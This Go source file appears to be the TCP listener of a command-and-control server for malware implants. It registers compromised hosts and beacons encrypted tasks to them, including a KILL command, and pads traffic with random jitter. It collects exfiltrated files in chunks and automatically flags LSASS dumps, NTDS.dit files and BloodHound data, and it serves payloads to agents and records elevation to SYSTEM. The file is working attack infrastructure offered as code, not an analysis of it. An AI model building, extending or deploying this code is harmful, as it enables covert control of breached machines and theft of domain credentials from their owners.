package server

import (
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"time"
)

// tcpFrame reads/writes length-prefixed frames: [4 bytes LE length][payload]
const tcpMaxFrame = 32 * 1024 * 1024

// tcpChunkState tracks an in-progress chunked file upload from a single agent connection.
type tcpChunkState struct {
	filename    string
	totalChunks int
	received    int
	tempPath    string
	file        *os.File
}

func tcpWriteFrame(conn net.Conn, data []byte) error {
	if len(data) == 0 || len(data) > tcpMaxFrame {
		return fmt.Errorf("invalid frame size %d", len(data))
	}
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(data)))
	if err := tcpWriteAll(conn, hdr); err != nil {
		return err
	}
	return tcpWriteAll(conn, data)
}

func tcpWriteAll(conn net.Conn, data []byte) error {
	for len(data) > 0 {
		n, err := conn.Write(data)
		if n > 0 {
			data = data[n:]
		}
		if err != nil {
			return err
		}
		if n == 0 {
			return io.ErrShortWrite
		}
	}
	return nil
}

func tcpReadFrame(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return nil, err
	}
	n := binary.LittleEndian.Uint32(hdr)
	if n == 0 || n > tcpMaxFrame {
		return nil, fmt.Errorf("invalid frame size %d", n)
	}
	buf := make([]byte, n)
	_, err := io.ReadFull(conn, buf)
	return buf, err
}

// tcpWriteTasks encrypts and sends a beacon response. Keeping this in one
// place is important: transient database errors must return an empty task set
// instead of dropping the TCP session without a response.
func tcpWriteTasks(conn net.Conn, key []byte, response beaconResponse) error {
	plain, err := json.Marshal(response)
	if err != nil {
		return fmt.Errorf("marshal tasks: %w", err)
	}
	enc, err := Seal(key, plain)
	if err != nil {
		return fmt.Errorf("encrypt tasks: %w", err)
	}
	out, err := json.Marshal(tcpMsg{
		Type:    "tasks",
		Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(enc) + `"`),
	})
	if err != nil {
		return fmt.Errorf("marshal tasks envelope: %w", err)
	}
	return tcpWriteFrame(conn, out)
}

// tcpWriteAck always terminates a result/upload request with a typed response.
// The C client validates the type and resets the session on a missing ACK.
func tcpWriteAck(conn net.Conn, ok bool, message string) error {
	payload := struct {
		OK    bool   `json:"ok"`
		Error string `json:"error,omitempty"`
	}{OK: ok, Error: message}
	out, err := json.Marshal(tcpMsg{Type: "ack", Payload: mustJSON(payload)})
	if err != nil {
		return fmt.Errorf("marshal ack: %w", err)
	}
	return tcpWriteFrame(conn, out)
}

func tcpOpenPayload(msg tcpMsg, key []byte) ([]byte, error) {
	var encoded string
	if err := json.Unmarshal(msg.Payload, &encoded); err != nil {
		return nil, fmt.Errorf("payload is not a base64 string: %w", err)
	}
	enc, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("decode payload: %w", err)
	}
	plain, err := Open(key, enc)
	if err != nil {
		return nil, fmt.Errorf("decrypt payload: %w", err)
	}
	return plain, nil
}

// tcpMsg wraps a typed message for the TCP protocol.
type tcpMsg struct {
	Type    string          `json:"t"`
	Payload json.RawMessage `json:"p"`
}

func (s *Server) StartTCPListener(ctx context.Context, port int) error {
	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		return fmt.Errorf("tcp listen :%d: %w", port, err)
	}
	s.printf("[*] TCP agent listener on :%d\n", port)
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				return
			}
			go s.handleTCPAgent(conn)
		}
	}()
	return nil
}

func (s *Server) handleTCPAgent(conn net.Conn) {
	defer conn.Close()
	activeChunks := make(map[string]*tcpChunkState)
	defer func() {
		for _, cs := range activeChunks {
			if cs.file != nil {
				cs.file.Close()
			}
			os.Remove(cs.tempPath)
		}
	}()
	remote := conn.RemoteAddr().String()
	ip := remote
	if host, _, splitErr := net.SplitHostPort(ip); splitErr == nil {
		ip = host
	}

	// ── 1. Register (plaintext) ────────────────────────────────────────
	conn.SetDeadline(time.Now().Add(30 * time.Second))
	frame, err := tcpReadFrame(conn)
	if err != nil {
		return
	}
	var msg tcpMsg
	if err := json.Unmarshal(frame, &msg); err != nil || msg.Type != "register" {
		return
	}
	var req registerRequest
	if err := json.Unmarshal(msg.Payload, &req); err != nil {
		return
	}

	transport := req.Transport
	if transport == "" {
		transport = "tcp"
	}
	sleepSec  := req.SleepSec
	jitterPct := req.JitterPct
	if sleepSec  <= 0 { sleepSec  = 5 }
	if jitterPct <  0 { jitterPct = 20 }

	// Session resumption: if the agent sends its old ID and it exists in the DB,
	// reuse it instead of minting a new UUID. A fresh AES key is always negotiated
	// since the server's in-memory state is lost on restart.
	agentID := newUUID()
	resumed := false
	if req.ResumeID != "" {
		// Always honour the preset ID — even if the DB record was deleted.
		// If found: true resume (first_seen preserved). If not found: use the
		// preset ID as the new agentID so the binary keeps its stable identity.
		agentID = req.ResumeID
		if existing, lookupErr := s.db.GetAgent(req.ResumeID); lookupErr == nil && existing != nil {
			resumed = true
		}
	}

	key, err := NewAESKey()
	if err != nil {
		return
	}

	agent := &Agent{
		ID:          agentID,
		Hostname:    req.Hostname,
		Username:    req.Username,
		OS:          req.OS,
		IP:          ip,
		PID:         req.PID,
		AESKey:      key,
		SleepSec:    sleepSec,
		JitterPct:   jitterPct,
		Transport:   transport,
		ProcessName: req.ProcessName,
		IsAdmin:     req.IsAdmin,
		ParentID:    req.ParentID,
		Language:    req.Language,
	}
	if err := s.db.RegisterAgent(agent); err != nil {
		return
	}

	resp := registerResponse{
		AgentID:   agentID,
		AESKey:    base64.StdEncoding.EncodeToString(key),
		SleepSec:  sleepSec,
		JitterPct: jitterPct,
	}
	respJSON, _ := json.Marshal(tcpMsg{Type: "register_resp", Payload: mustJSON(resp)})
	if err := tcpWriteFrame(conn, respJSON); err != nil {
		return
	}
	if resumed {
		s.printf("[~] TCP agent resumed: %s  %s@%s  (%s)\n", agentID[:8], req.Username, req.Hostname, ip)
	} else {
		s.printf("[+] TCP agent: %s  %s@%s  (%s)\n", agentID[:8], req.Username, req.Hostname, ip)
	}
	guiMsg := fmt.Sprintf("new tcp agent: %s@%s (%s)", req.Username, req.Hostname, ip)
	if resumed {
		guiMsg = fmt.Sprintf("tcp agent resumed: %s@%s (%s)", req.Username, req.Hostname, ip)
	}
	BroadcastGUI("AGENT_CHECKIN", agentID, guiMsg)

	// ── 2. Beacon loop ─────────────────────────────────────────────────
	conn.SetDeadline(time.Time{}) // no global deadline; per-read below
	disconnectReason := "connection closed"
	beaconLoop:
	for {
		conn.SetDeadline(time.Now().Add(4 * time.Hour))
		frame, err := tcpReadFrame(conn)
		if err != nil {
			disconnectReason = err.Error()
			break
		}
		if err := json.Unmarshal(frame, &msg); err != nil {
			disconnectReason = fmt.Sprintf("invalid message: %v", err)
			break
		}

		switch msg.Type {
		case "beacon":
			ag, dbErr := s.db.GetAgent(agentID)
			if dbErr != nil {
				// A transient SQLite/WAL error must not be interpreted as an
				// operator kill. Return an empty response and let the next
				// beacon retry the database operation.
				s.printf("[!] TCP agent %s: get agent state failed: %v\n", agentID[:8], dbErr)
				if writeErr := tcpWriteTasks(conn, key, beaconResponse{Tasks: []taskWire{}}); writeErr != nil {
					disconnectReason = fmt.Sprintf("write db-retry response: %v", writeErr)
					break beaconLoop
				}
				continue
			}
			if !ag.Active {
				// Agent was deleted or killed — send KILL using the session key
				// (identical to the AES key stored in DB / ghost map) and close.
				killWires := []taskWire{{ID: 0, Type: "KILL", Args: ""}}
				_ = tcpWriteTasks(conn, key, beaconResponse{Tasks: killWires})
				return
			}
			if touchErr := s.db.TouchAgent(agentID); touchErr != nil {
				s.printf("[!] TCP agent %s: touch failed: %v\n", agentID[:8], touchErr)
			}
			tasks, err := s.db.ClaimPendingTasks(agentID, 32)
			if err != nil {
				// Claiming is retried on the next beacon. Do not kill the
				// agent just because the database was briefly busy/locked.
				s.printf("[!] TCP agent %s: claim tasks failed: %v\n", agentID[:8], err)
				if writeErr := tcpWriteTasks(conn, key, beaconResponse{Tasks: []taskWire{}}); writeErr != nil {
					disconnectReason = fmt.Sprintf("write claim-retry response: %v", writeErr)
					break beaconLoop
				}
				continue
			}

			var wires []taskWire
			for _, t := range tasks {
				tw := taskWire{ID: t.ID, Type: t.Type, Args: t.Args}
				if len(t.Payload) > 0 {
					tw.Payload = base64.StdEncoding.EncodeToString(t.Payload)
			}
				wires = append(wires, tw)
			}
			var peers []peerWire
			for _, p := range s.getMeshPeers(agentID) {
				peers = append(peers, peerWire{Addr: p.Addr, Proto: p.Proto})
			}
			br := beaconResponse{Tasks: wires, Peers: peers}
			if DataJitterMax > 0 {
				b := make([]byte, DataJitterMax)
				rand.Read(b) //nolint:errcheck
				enc := base64.StdEncoding.EncodeToString(b)
				if len(enc) > DataJitterMax {
					enc = enc[:DataJitterMax]
				}
				br.Padding = enc
			}
			if err := tcpWriteTasks(conn, key, br); err != nil {
				disconnectReason = fmt.Sprintf("write tasks: %v", err)
				break beaconLoop
			}

		case "result":
			plain, err := tcpOpenPayload(msg, key)
			if err != nil {
				s.printf("[!] TCP agent %s: invalid result: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write result error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			var res resultRequest
			if err := json.Unmarshal(plain, &res); err != nil {
				s.printf("[!] TCP agent %s: invalid result JSON: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write result JSON error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			if err := s.db.InsertResult(res.TaskID, agentID, res.Output, res.Error); err != nil {
				s.printf("[!] TCP agent %s: insert result #%d failed: %v\n", agentID[:8], res.TaskID, err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write result database error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			if res.IsAdmin {
				s.db.UpdateAgentAdmin(agentID, true)
				s.db.UpdateAgentUsername(agentID, "nt authority\\system")
				BroadcastGUI("AGENT_ADMIN", agentID, "elevated to SYSTEM")
			}
			go s.maybeRegisterMeshPeer(agentID, res.Output)
			if res.Output != "" {
				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d complete", res.TaskID), res.TaskID)
			}
			if res.Error != "" {
				BroadcastGUI("TASK_RESULT", agentID, fmt.Sprintf("task #%d error: %s", res.TaskID, res.Error), res.TaskID)
			}
			if err := tcpWriteAck(conn, true, ""); err != nil {
				disconnectReason = fmt.Sprintf("write result ACK: %v", err)
				break beaconLoop
			}

		case "upload":
			// file upload: payload is base64(encrypted JSON {task_id, filename, data_b64})
			plain, err := tcpOpenPayload(msg, key)
			if err != nil {
				s.printf("[!] TCP agent %s: invalid upload: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			var ureq struct {
				TaskID   int64  `json:"task_id"`
				Filename string `json:"filename"`
				Data     string `json:"data"` // base64
			}
			if err := json.Unmarshal(plain, &ureq); err != nil {
				s.printf("[!] TCP agent %s: invalid upload JSON: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload JSON error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			fileData, err := base64.StdEncoding.DecodeString(ureq.Data)
			if err != nil {
				s.printf("[!] TCP agent %s: invalid upload data: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload data error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
			if err := os.MkdirAll(dir, 0700); err != nil {
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload mkdir error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			filename := filepath.Base(ureq.Filename)
			if filename == "." || filename == string(filepath.Separator) || filename == "" {
				if ackErr := tcpWriteAck(conn, false, "invalid filename"); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload filename error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			if err := os.WriteFile(filepath.Join(dir, filename), fileData, 0600); err != nil {
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write upload file error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			s.printf("[%s] tcp upload: %s (%d bytes)\n", agentID[:8], filename, len(fileData))
			go s.CheckAndPromptBH(agentID, filename, fileData)
			go s.CheckAndPromptLSASS(agentID, filename)
			go s.CheckAndPromptNTDS(agentID, filename)
			if err := tcpWriteAck(conn, true, ""); err != nil {
				disconnectReason = fmt.Sprintf("write upload ACK: %v", err)
				break beaconLoop
			}

		case "upload_chunk":
			plain, err := tcpOpenPayload(msg, key)
			if err != nil {
				s.printf("[!] TCP agent %s: invalid upload_chunk: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write chunk error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			var creq struct {
				TaskID      int64  `json:"task_id"`
				Filename    string `json:"filename"`
				FileID      string `json:"file_id"`
				ChunkIndex  int    `json:"chunk_index"`
				TotalChunks int    `json:"total_chunks"`
				Data        string `json:"data"`
			}
			if err := json.Unmarshal(plain, &creq); err != nil || creq.FileID == "" || creq.TotalChunks < 1 {
				s.printf("[!] TCP agent %s: invalid upload_chunk JSON\n", agentID[:8])
				if ackErr := tcpWriteAck(conn, false, "invalid chunk"); ackErr != nil {
					disconnectReason = fmt.Sprintf("write chunk JSON error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			chunkData, err := base64.StdEncoding.DecodeString(creq.Data)
			if err != nil {
				s.printf("[!] TCP agent %s: upload_chunk bad data: %v\n", agentID[:8], err)
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write chunk data error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			dir := filepath.Join(s.cfg.DataDir, "uploads", agentID)
			if err := os.MkdirAll(dir, 0700); err != nil {
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write chunk mkdir error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			cs, exists := activeChunks[creq.FileID]
			if !exists {
				tempPath := filepath.Join(dir, creq.FileID+".tmp")
				f, err := os.OpenFile(tempPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0600)
				if err != nil {
					if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
						disconnectReason = fmt.Sprintf("write chunk open error: %v", ackErr)
						break beaconLoop
					}
					continue
				}
				cs = &tcpChunkState{
					filename:    filepath.Base(creq.Filename),
					totalChunks: creq.TotalChunks,
					tempPath:    tempPath,
					file:        f,
				}
				activeChunks[creq.FileID] = cs
			}
			if _, err := cs.file.Write(chunkData); err != nil {
				if ackErr := tcpWriteAck(conn, false, err.Error()); ackErr != nil {
					disconnectReason = fmt.Sprintf("write chunk write error: %v", ackErr)
					break beaconLoop
				}
				continue
			}
			cs.received++
			if cs.received == cs.totalChunks {
				cs.file.Close()
				cs.file = nil
				finalPath := filepath.Join(dir, cs.filename)
				if renameErr := os.Rename(cs.tempPath, finalPath); renameErr != nil {
					if ackErr := tcpWriteAck(conn, false, renameErr.Error()); ackErr != nil {
						disconnectReason = fmt.Sprintf("write chunk rename error: %v", ackErr)
						break beaconLoop
					}
					delete(activeChunks, creq.FileID)
					continue
				}
				info, _ := os.Stat(finalPath)
				var fileSize int64
				if info != nil {
					fileSize = info.Size()
				}
				s.printf("[%s] tcp upload: %s (%d bytes, %d chunks)\n", agentID[:8], cs.filename, fileSize, cs.totalChunks)
				fileData, _ := os.ReadFile(finalPath)
				go s.CheckAndPromptBH(agentID, cs.filename, fileData)
				go s.CheckAndPromptLSASS(agentID, cs.filename)
				go s.CheckAndPromptNTDS(agentID, cs.filename)
				delete(activeChunks, creq.FileID)
			}
			if err := tcpWriteAck(conn, true, ""); err != nil {
				disconnectReason = fmt.Sprintf("write chunk ACK: %v", err)
				break beaconLoop
			}

		case "download":
			// Always respond with "dl_resp" (never "ack") so the client's
			// tcp_recv_enc("dl_resp") never sees a type mismatch that would
			// trigger tcp_reset() and drop the connection.
			var dlData []byte
			plain, err := tcpOpenPayload(msg, key)
			if err == nil {
				var dreq struct {
					Filename string `json:"filename"`
				}
				if jsonErr := json.Unmarshal(plain, &dreq); jsonErr == nil && dreq.Filename != "" {
					name := filepath.Base(dreq.Filename)
					for _, dir := range []string{
						filepath.Join(s.cfg.DataDir, "downloads"),
						filepath.Join(s.cfg.DataDir, "uploads", agentID),
						filepath.Join(s.cfg.DataDir, "uploads"),
						filepath.Join(projectRoot(), "bin", "payloads"),
					} {
						if d, readErr := os.ReadFile(filepath.Join(dir, name)); readErr == nil {
							dlData = d
							break
						}
					}
					if dlData == nil {
						s.printf("[!] TCP agent %s: download: file not found: %s\n", agentID[:8], name)
					}
				} else {
					s.printf("[!] TCP agent %s: invalid download JSON: %v\n", agentID[:8], jsonErr)
				}
			} else {
				s.printf("[!] TCP agent %s: invalid download payload: %v\n", agentID[:8], err)
			}
			// Send "dl_resp" with base64 data (empty string means not found / error).
			dlResp := struct {
				Data string `json:"data"`
			}{Data: base64.StdEncoding.EncodeToString(dlData)}
			dlJSON, _ := json.Marshal(dlResp)
			dlEnc, encErr := Seal(key, dlJSON)
			if encErr != nil {
				disconnectReason = fmt.Sprintf("download: encrypt failed: %v", encErr)
				break beaconLoop
			}
			dlOut, _ := json.Marshal(tcpMsg{
				Type:    "dl_resp",
				Payload: json.RawMessage(`"` + base64.StdEncoding.EncodeToString(dlEnc) + `"`),
			})
			if err := tcpWriteFrame(conn, dlOut); err != nil {
				disconnectReason = fmt.Sprintf("write download resp: %v", err)
				break beaconLoop
			}

		default:
			s.printf("[!] TCP agent %s: ignoring unknown message type %q\n", agentID[:8], msg.Type)
		}
	}

	s.db.KillAgent(agentID)
	s.printf("[!] TCP agent %s disconnected: %s\n", agentID[:8], disconnectReason)
	BroadcastGUI("AGENT_DEAD", agentID, fmt.Sprintf("tcp connection closed: %s", disconnectReason))
}

func mustJSON(v any) json.RawMessage {
	b, _ := json.Marshal(v)
	return b
}
